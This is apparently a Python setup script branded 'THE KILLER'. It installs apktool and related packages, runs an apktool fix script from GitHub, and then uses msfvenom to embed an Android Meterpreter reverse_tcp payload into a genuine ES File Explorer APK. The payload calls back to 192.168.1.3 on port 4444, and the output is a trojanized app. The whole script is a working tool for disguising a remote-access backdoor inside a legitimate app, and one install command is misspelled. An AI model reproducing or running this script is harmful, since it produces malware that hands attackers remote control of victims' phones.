from os import system
from time import sleep
system("clear")
print ("""
\033[1;31m
████████╗██╗  ██╗███████╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
╚══██╔══╝██║  ██║██╔════╝    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
   ██║   ███████║█████╗      █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
   ██║   ██╔══██║██╔══╝      ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
   ██║   ██║  ██║███████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
""")
print ("\033[1;34mThis Tool Runing a Automatic Pleasse Donnt turn Off Tool")
sleep(1.5)
system ("""
apt-get install zipalign -y
apt-get install xterm -y
apt-get instal zenity -y
apt-get install openjdk-11-jdk -y
clear
cd Files
cp -r apktool /usr/local/bin
cp -r apktool.jar /usr/local/bin
chmod +x *
cd
chmod +x *
cd Desktop
git clone https://github.com/graylagx2/apktoolfix.git
clear
cd apktoolfix
chmod +x *
./apktoolfix_2.1.2.sh
./apktoolfix_2.1.2.sh
./apktoolfix_2.1.2.sh
./apktoolfix_2.1.2.sh
figlet -f future Testing Apktool | lolcat
""")
system("sudo msfvenom -x Files/ES-File-Explorer.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.3 lport=4444 R > /root/Desktop/TestApllecation.apk ")
system("figlet -f mono9 Testing Apktool | lolcat")
